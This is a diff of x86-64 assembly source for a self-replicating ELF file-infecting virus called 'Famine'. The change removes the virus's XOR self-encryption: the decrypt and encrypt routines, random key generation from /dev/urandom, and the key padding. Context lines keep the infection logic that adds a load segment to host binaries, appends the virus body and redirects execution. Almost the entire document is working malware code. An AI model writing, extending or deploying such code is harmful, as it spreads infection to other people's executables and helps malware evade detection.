@@ -9,7 +9,6 @@
 
 ; Constants for virus operation
 %define VIRUS_STACK_SIZE  16384  ; Stack space for virus buffers
-%define KEY_SIZE          16     ; Encryption key size in bytes
 
 section .bss
     path_buffer:    resb PATH_BUFF_SIZE       ; buffer for building full path
@@ -45,10 +44,6 @@ virus_start:
 original_entry_storage:
     dq 0                        ; 8 bytes for original entry point
 
-; Encryption flag - 1 if encrypted, 0 if not
-encryption_flag:
-    dq 0                        ; 8 bytes for encryption flag
-
 _start:
     ; Save all registers we'll use
     push rbp
@@ -81,15 +76,6 @@ _start:
     pop r15                     ; r15 = address of .get_base label
     sub r15, .get_base - virus_start  ; r15 = base address of virus_start
 
-    ; Check if we need to decrypt (only in infected binaries)
-    mov rax, [r15 + encryption_flag - virus_start]
-    test rax, rax
-    jz .skip_decrypt            ; if 0, not encrypted (original Famine)
-    
-    ; Decrypt the virus code
-    call decrypt_file
-
-.skip_decrypt:
     ; Check if original_entry_storage is 0 (we're the original Famine binary)
     mov rax, [r15 + original_entry_storage - virus_start]
     test rax, rax
@@ -185,184 +171,6 @@ _start:
     
     ; Jump to original entry point
     jmp rax
-
-; ============================================
-; decrypt_file - Decrypt virus code using XOR with key
-; r15 = virus base address (already set by caller)
-; This function decrypts the virus code from encrypt_start to virus_end
-; using the key stored at virus_end
-; MUST NOT BE ENCRYPTED - placed before encrypt_start
-; ============================================
-decrypt_file:
-    push rax
-    push rcx
-    push rsi
-    push rdi
-    push rdx
-    
-    ; Get pointer to start of encrypted region
-    lea rsi, [r15 + encrypt_start - virus_start]
-    
-    ; Get pointer to key (stored at virus_end)
-    lea rdi, [r15 + virus_end - virus_start]
-    
-    ; Calculate size to decrypt
-    mov rcx, virus_end - encrypt_start
-    
-    ; rsi = pointer to virus data
-    ; rdi = pointer to key
-    ; rcx = size to decrypt
-    xor rdx, rdx                ; rdx = key index (0 to KEY_SIZE-1)
-    
-.decrypt_loop:
-    test rcx, rcx
-    jz .decrypt_done
-    
-    ; XOR byte with key byte
-    mov al, [rsi]               ; load virus byte
-    xor al, [rdi + rdx]         ; XOR with key byte
-    mov [rsi], al               ; store decrypted byte
-    
-    ; Increment pointers
-    inc rsi                     ; next virus byte
-    inc rdx                     ; next key byte
-    and rdx, KEY_SIZE - 1       ; wrap around at KEY_SIZE (key length)
-    
-    dec rcx
-    jmp .decrypt_loop
-    
-.decrypt_done:
-    pop rdx
-    pop rdi
-    pop rsi
-    pop rcx
-    pop rax
-    ret
-
-; ============================================
-; encrypt_file - Encrypt virus code using XOR with key
-; rdi = pointer to virus copy buffer
-; rsi = pointer to key (KEY_SIZE bytes)
-; This function encrypts the virus code from encrypt_start to virus_end
-; MUST NOT BE ENCRYPTED - placed before encrypt_start
-; ============================================
-encrypt_file:
-    push rax
-    push rcx
-    push rdx
-    push rsi
-    push rdi
-    
-    ; Adjust rdi to point to encrypt_start in the buffer
-    add rdi, encrypt_start - virus_start
-    
-    ; Calculate size to encrypt
-    mov rcx, virus_end - encrypt_start
-    
-    ; rdi = pointer to virus data in buffer
-    ; rsi = pointer to key
-    ; rcx = size to encrypt
-    xor rdx, rdx                ; rdx = key index (0 to KEY_SIZE-1)
-    
-.encrypt_loop:
-    test rcx, rcx
-    jz .encrypt_done
-    
-    ; XOR byte with key byte
-    mov al, [rdi]               ; load virus byte
-    xor al, [rsi + rdx]         ; XOR with key byte
-    mov [rdi], al               ; store encrypted byte
-    
-    ; Increment pointers
-    inc rdi                     ; next virus byte
-    inc rdx                     ; next key byte
-    and rdx, KEY_SIZE - 1       ; wrap around at KEY_SIZE (key length)
-    
-    dec rcx
-    jmp .encrypt_loop
-    
-.encrypt_done:
-    pop rdi
-    pop rsi
-    pop rdx
-    pop rcx
-    pop rax
-    ret
-
-; ============================================
-; get_random_string - Generate a random KEY_SIZE-byte key
-; rdi = pointer to buffer where key will be stored (must be at least KEY_SIZE bytes)
-; Uses /dev/urandom for randomness
-; MUST NOT BE ENCRYPTED - placed before encrypt_start
-; ============================================
-get_random_string:
-    push rbx
-    push rcx
-    push rdx
-    push rsi
-    push rdi
-    push r12
-    
-    mov r12, rdi                ; save buffer pointer
-    
-    ; Open /dev/urandom
-    mov eax, SYS_OPENAT
-    mov edi, AT_FDCWD
-    lea rsi, [rel v_urandom_path]
-    xor edx, edx                ; O_RDONLY
-    xor r10d, r10d
-    syscall
-    
-    test rax, rax
-    js .random_fallback         ; if failed, use fallback
-    
-    mov rbx, rax                ; save fd
-    
-    ; Read KEY_SIZE random bytes
-    mov eax, SYS_READ
-    mov rdi, rbx
-    mov rsi, r12
-    mov edx, KEY_SIZE
-    syscall
-    
-    ; Close /dev/urandom
-    mov eax, SYS_CLOSE
-    mov rdi, rbx
-    syscall
-    
-    jmp .random_done
-    
-.random_fallback:
-    ; Fallback: use a simple pattern (not truly random, but functional)
-    ; In a real scenario, this would be problematic, but for the virus it's acceptable
-    mov rdi, r12
-    mov rcx, KEY_SIZE
-    mov al, 0x42                ; Simple pattern
-.fallback_loop:
-    stosb
-    inc al
-    dec rcx
-    jnz .fallback_loop
-    
-.random_done:
-    pop r12
-    pop rdi
-    pop rsi
-    pop rdx
-    pop rcx
-    pop rbx
-    ret
-
-; ============================================
-; Path to /dev/urandom (in code section for position independence)
-; ============================================
-v_urandom_path: db "/dev/urandom", 0
-
-; ============================================
-; Mark the start of encrypted region
-; Everything from here to virus_end will be encrypted
-; ============================================
-encrypt_start:
 
 ; ============================================
 ; Embedded virus strings (in code section for position independence)
@@ -894,8 +702,8 @@ virus_infect_elf:
     mov [rsi+24], r8            ; p_paddr
     mov [rbp-24], r8            ; save for later
 
-    ; p_filesz and p_memsz = virus size + KEY_SIZE bytes for encryption key
-    mov rax, virus_end - virus_start + KEY_SIZE
+    ; p_filesz and p_memsz = virus size
+    mov rax, virus_end - virus_start
     mov [rsi+32], rax           ; p_filesz
     mov [rsi+40], rax           ; p_memsz
 
@@ -962,22 +770,6 @@ virus_infect_elf:
     add rcx, _start - virus_start  ; add offset to _start
     sub rax, rcx                ; offset = original_entry - our_entry
     mov [rdi + original_entry_storage - virus_start], rax
-    
-    ; Set encryption flag to 1 (indicating this copy is encrypted)
-    mov qword [rdi + encryption_flag - virus_start], 1
-    
-    ; Generate random encryption key and store at virus_end
-    push rdi
-    lea rdi, [rbp-4224]
-    add rdi, virus_end - virus_start
-    call get_random_string
-    pop rdi
-    
-    ; Encrypt the virus copy
-    ; rdi already points to the buffer
-    lea rsi, [rbp-4224]
-    add rsi, virus_end - virus_start  ; point to key
-    call encrypt_file
 
     ; Seek to end of file
     mov eax, SYS_LSEEK
@@ -986,11 +778,11 @@ virus_infect_elf:
     mov edx, SEEK_END
     syscall
 
-    ; Write virus code + key (16 extra bytes)
+    ; Write virus code
     mov eax, SYS_WRITE
     mov edi, r13d
     lea rsi, [rbp-4224]
-    mov edx, virus_end - virus_start + KEY_SIZE
+    mov edx, virus_end - virus_start
     syscall
 
     ; Close file
@@ -1103,8 +895,6 @@ virus_infect_elf:
 ; VIRUS CODE END
 ; ============================================
 virus_end:
-; The KEY_SIZE-byte encryption key is stored immediately after virus_end
-; Total virus size including key = virus_end - virus_start + KEY_SIZE
 
 ; ============================================
 ; Non-virus code (regular Famine operation)
@@ -1363,7 +1153,7 @@ add_pt_load:
     mov qword [rsi + p_paddr], r8
     mov [rbp-32], r8            ; save new vaddr
 
-    mov rax, virus_end - virus_start + KEY_SIZE
+    mov rax, virus_end - virus_start
     mov qword [rsi + p_filesz], rax
     mov qword [rsi + p_memsz], rax
     mov qword [rsi + p_align], 0x1000
@@ -1427,22 +1217,6 @@ add_pt_load:
     add rcx, _start - virus_start  ; add offset to _start
     sub rax, rcx                ; offset = original_entry - our_entry
     mov [rdi + original_entry_storage - virus_start], rax
-    
-    ; Set encryption flag to 1 (indicating this copy is encrypted)
-    mov qword [rdi + encryption_flag - virus_start], 1
-    
-    ; Generate random encryption key and store at virus_end
-    push rdi
-    lea rdi, [rel virus_copy_buf]
-    add rdi, virus_end - virus_start
-    call get_random_string
-    pop rdi
-    
-    ; Encrypt the virus copy
-    lea rdi, [rel virus_copy_buf]
-    lea rsi, [rel virus_copy_buf]
-    add rsi, virus_end - virus_start  ; point to key
-    call encrypt_file
 
     ; Write virus to end of file
     mov eax, SYS_LSEEK
@@ -1454,7 +1228,7 @@ add_pt_load:
     mov eax, SYS_WRITE
     mov edi, r13d
     lea rsi, [rel virus_copy_buf]
-    mov edx, virus_end - virus_start + KEY_SIZE
+    mov edx, virus_end - virus_start
     syscall
 
     ; Close file
